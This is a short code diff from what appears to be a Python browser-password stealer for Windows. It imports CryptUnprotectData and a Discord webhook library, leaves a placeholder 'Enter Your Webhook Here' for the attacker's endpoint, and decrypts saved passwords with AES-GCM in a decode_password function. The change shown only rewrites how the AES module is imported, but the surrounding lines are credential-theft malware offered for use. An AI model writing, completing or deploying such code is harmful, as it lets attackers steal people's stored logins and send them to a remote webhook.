@@ -5,7 +5,7 @@ import sqlite3
 import json
 from win32crypt import CryptUnprotectData
 from base64 import b64decode
-from Crypto.Cipher import AES
+import Crypto.Cipher as c
 from shutil import copy2
 from discord_webhook import *
 webhook = "WEBHOOK_URL" #Enter Your Webhook Here !!
@@ -31,7 +31,7 @@ def heck():
     def decode_password(buffer, master_key):
         try:
             bufiv, payload = buffer[3:15], buffer[15:]
-            cipher = AES.new(master_key, AES.MODE_GCM, bufiv)
+            cipher = c.AES.new(master_key, c.AES.MODE_GCM, bufiv)
             decoded = cipher.decrypt(payload)[:-16].decode()
             return decoded
         except:
